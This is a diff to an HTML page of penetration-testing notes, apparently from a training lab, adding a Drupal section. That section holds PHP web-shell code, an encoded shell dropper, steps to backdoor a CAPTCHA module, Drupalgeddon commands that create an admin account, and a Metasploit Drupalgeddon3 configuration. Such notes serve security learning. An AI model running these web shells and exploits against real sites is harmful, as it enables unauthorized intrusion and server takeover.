@@ -1019,6 +1019,99 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#drupal" class="md-nav__link">
+    <span class="md-ellipsis">
+      Drupal
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Drupal">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#discovery_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Discovery
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enumeration_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacking-drupal" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacking Drupal
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attacking Drupal">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#leveraging-the-php-filter-module" class="md-nav__link">
+    <span class="md-ellipsis">
+      Leveraging the PHP Filter Module
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#uploading-a-backdoored-module" class="md-nav__link">
+    <span class="md-ellipsis">
+      Uploading a Backdoored Module
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#drupalgeddon" class="md-nav__link">
+    <span class="md-ellipsis">
+      Drupalgeddon
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#drupalgeddon2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Drupalgeddon2
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#drupalgeddon3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Drupalgeddon3
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -1385,6 +1478,99 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#drupal" class="md-nav__link">
+    <span class="md-ellipsis">
+      Drupal
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Drupal">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#discovery_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Discovery
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enumeration_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacking-drupal" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacking Drupal
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attacking Drupal">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#leveraging-the-php-filter-module" class="md-nav__link">
+    <span class="md-ellipsis">
+      Leveraging the PHP Filter Module
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#uploading-a-backdoored-module" class="md-nav__link">
+    <span class="md-ellipsis">
+      Uploading a Backdoored Module
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#drupalgeddon" class="md-nav__link">
+    <span class="md-ellipsis">
+      Drupalgeddon
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#drupalgeddon2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Drupalgeddon2
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#drupalgeddon3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Drupalgeddon3
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -1730,6 +1916,160 @@
 <div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-1">curl<span class="w"> </span>-s<span class="w"> </span>http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e<span class="o">=</span>id
 </span></code></pre></div></td></tr></table></div></li>
 <li>Remember to remove webshell after recording the vulnerability</li>
+</ul>
+<h2 id="drupal">Drupal</h2>
+<h3 id="discovery_1">Discovery</h3>
+<ul>
+<li>"Powered by Drupal" header/footer</li>
+<li>Standard Drupal logo</li>
+<li>The presence of a CHANGELOG.txt file or README.txt file, via the page source</li>
+<li>Clues in the robots.txt file such as references to /node</li>
+<li>grep search:
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-1">curl<span class="w"> </span>-s<span class="w"> </span>http://drupal.inlanefreight.local<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>Drupal
+</span></code></pre></div></td></tr></table></div></li>
+<li>References to <a href="https://www.drupal.org/docs/core-modules-and-themes/core-modules/node-module/about-nodes">nodes</a>: <code>http://drupal.inlanefreight.local/node/1</code></li>
+</ul>
+<h3 id="enumeration_1">Enumeration</h3>
+<ul>
+<li>
+<p>Drupal supports three types of users by default:</p>
+<ul>
+<li>Administrator: This user has complete control over the Drupal website.</li>
+<li>Authenticated User: These users can log in to the website and perform operations such as adding and editing articles based on their permissions.</li>
+<li>Anonymous: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.</li>
+</ul>
+</li>
+<li>
+<p>Output first two lines of CHANGELOG.txt to see the version in use (will return 404 on latest versions):
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-22-1">curl<span class="w"> </span>-s<span class="w"> </span>http://drupal-acc.inlanefreight.local/CHANGELOG.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-m2<span class="w"> </span><span class="s2">&quot;&quot;</span>
+</span></code></pre></div></td></tr></table></div></p>
+</li>
+<li>use droopscan:
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-23-1">droopescan<span class="w"> </span>scan<span class="w"> </span>drupal<span class="w"> </span>-u<span class="w"> </span>http://drupal.inlanefreight.local
+</span></code></pre></div></td></tr></table></div></li>
+</ul>
+<h3 id="attacking-drupal">Attacking Drupal</h3>
+<h4 id="leveraging-the-php-filter-module">Leveraging the PHP Filter Module</h4>
+<ul>
+<li>Log in as admin</li>
+<li>Enable the PHP filter module by ticking the check box next to the module and scroll down to Save configuration</li>
+<li>Go to Content --&gt; Add content and create a Basic page</li>
+<li>Create malicious page:
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-24-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-24-2"><span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;dcfdd5e021a869fcc6dfaef8bf31377e&#39;</span><span class="p">]);</span>
+</span><span id="__span-24-3"><span class="cp">?&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>Set Text format drop-down to PHP code</li>
+<li>Click Save</li>
+<li>
+<p>Check function of reverse shell
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-25-1">curl<span class="w"> </span>-s<span class="w"> </span>http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e<span class="o">=</span>id<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>uid<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-f4<span class="w"> </span>-d<span class="s2">&quot;&gt;&quot;</span>
+</span></code></pre></div></td></tr></table></div></p>
+</li>
+<li>
+<p>From version 8 onwards the <a href="https://www.drupal.org/project/php/releases/8.x-1.1">PHP Filter</a> module requires installing first:
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-26-1">wget<span class="w"> </span>https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
+</span></code></pre></div></td></tr></table></div></p>
+</li>
+<li>May need to adjust above command for most recent version</li>
+<li>Once downloaded go to <code>Administration &gt; Reports &gt; Available updates</code> (location may differ)</li>
+<li><code>Browse</code> to select downloaded file and click <code>Install</code></li>
+<li>Once installed click <code>Content</code> to create basic page like before</li>
+<li>Post pentest delete any installed modules and created pages</li>
+</ul>
+<h4 id="uploading-a-backdoored-module">Uploading a Backdoored Module</h4>
+<ul>
+<li>Add a shell to an existing module</li>
+<li>Example using the CAPTCHA module</li>
+<li>Download module
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-27-1">wget<span class="w"> </span>--no-check-certificate<span class="w">  </span>https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
+</span><span id="__span-27-2">tar<span class="w"> </span>xvf<span class="w"> </span>captcha-8.x-1.2.tar.gz
+</span></code></pre></div></td></tr></table></div>
+Create a webshell file:
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-28-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-28-2"><span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;fe8edbabc5c5c9b7b764504cd22b17af&#39;</span><span class="p">]);</span>
+</span><span id="__span-28-3"><span class="cp">?&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+Create a .htaccess file to give ourselves access to the folder
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-29-1"><span class="p">&lt;</span><span class="nt">IfModule</span> <span class="na">mod_rewrite</span><span class="err">.</span><span class="na">c</span><span class="p">&gt;</span>
+</span><span id="__span-29-2">RewriteEngine On
+</span><span id="__span-29-3">RewriteBase /
+</span><span id="__span-29-4"><span class="p">&lt;/</span><span class="nt">IfModule</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>Copy created files to the captcha folder
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-30-1">mv<span class="w"> </span>shell.php<span class="w"> </span>.htaccess<span class="w"> </span>captcha
+</span><span id="__span-30-2">tar<span class="w"> </span>cvf<span class="w"> </span>captcha.tar.gz<span class="w"> </span>captcha/
+</span></code></pre></div></td></tr></table></div></li>
+<li>Login to site with admin access</li>
+<li>Click on <code>Manage</code> and then <code>Extend</code> on the sidebar</li>
+<li>Click on the <code>+ Install new module</code> button</li>
+<li>Browse to the backdoored Captcha archive and click <code>Install</code></li>
+<li>Browse to <code>/modules/captcha/shell.php</code> to execute commands
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-31-1">curl<span class="w"> </span>-s<span class="w"> </span>drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af<span class="o">=</span>id
+</span></code></pre></div></td></tr></table></div></li>
+</ul>
+<h4 id="drupalgeddon">Drupalgeddon</h4>
+<ul>
+<li>Affects versions 7.0 up to 7.31</li>
+<li>Used to upload a malicious form or create a new admin user</li>
+<li><a href="https://www.exploit-db.com/exploits/34992">PoC</a></li>
+<li>Supply the target URL and a username and password for our new admin account
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-32-1">python2.7<span class="w"> </span>drupalgeddon.py<span class="w"> </span>-t<span class="w"> </span>http://drupal-qa.inlanefreight.local<span class="w"> </span>-u<span class="w"> </span>hacker<span class="w"> </span>-p<span class="w"> </span>pwnd
+</span></code></pre></div></td></tr></table></div></li>
+</ul>
+<h4 id="drupalgeddon2">Drupalgeddon2</h4>
+<ul>
+<li>Affects versions prior to 7.58 and 8.5.1</li>
+<li>Allows system-level commands to be maliciously injected</li>
+<li><a href="https://www.exploit-db.com/exploits/44448">PoC</a></li>
+<li>Replace the echo command in the exploit script with a command to write out our malicious PHP script (and references to hello.txt):
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-33-1"><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>mrb3n.php
+</span></code></pre></div></td></tr></table></div></li>
+<li>Run module and fill in relevant details to upload shell
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-34-1">python3<span class="w"> </span>drupalgeddon2.py
+</span><span id="__span-34-2">...
+</span><span id="__span-34-3">Enter<span class="w"> </span>target<span class="w"> </span>url<span class="w"> </span><span class="o">(</span>example:<span class="w"> </span>https://domain.ltd/<span class="o">)</span>:<span class="w"> </span>http://drupal-dev.inlanefreight.local/
+</span><span id="__span-34-4">Check:<span class="w"> </span>http://drupal-dev.inlanefreight.local/mrb3n.php
+</span></code></pre></div></td></tr></table></div></li>
+<li>Confirm RCE
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-35-1">curl<span class="w"> </span>http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af<span class="o">=</span>id
+</span></code></pre></div></td></tr></table></div></li>
+</ul>
+<h4 id="drupalgeddon3">Drupalgeddon3</h4>
+<ul>
+<li>Affects multiple versions of Drupal 7.x and 8.x </li>
+<li>RCE vulnerability that exploits improper validation in the Form API</li>
+<li>Requires a user to have the ability to delete a node</li>
+<li>Log in and obtain a valid session cookie</li>
+<li>Load metasploit and add required options
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span>
+<span class="normal">8</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-36-1">msfconsole
+</span><span id="__span-36-2">use<span class="w"> </span>multi/http/drupal_drupageddon3
+</span><span id="__span-36-3"><span class="nb">set</span><span class="w"> </span>rhosts<span class="w"> </span><span class="m">10</span>.129.42.195
+</span><span id="__span-36-4"><span class="nb">set</span><span class="w"> </span>VHOST<span class="w"> </span>drupal-acc.inlanefreight.local<span class="w">   </span>
+</span><span id="__span-36-5"><span class="nb">set</span><span class="w"> </span>drupal_session<span class="w"> </span><span class="nv">SESS45ecfcb93a827c3e578eae161f280548</span><span class="o">=</span>jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
+</span><span id="__span-36-6"><span class="nb">set</span><span class="w"> </span>DRUPAL_NODE<span class="w"> </span><span class="m">1</span>
+</span><span id="__span-36-7"><span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">10</span>.10.14.15
+</span><span id="__span-36-8">exploit
+</span></code></pre></div></td></tr></table></div></li>
 </ul>
 
 
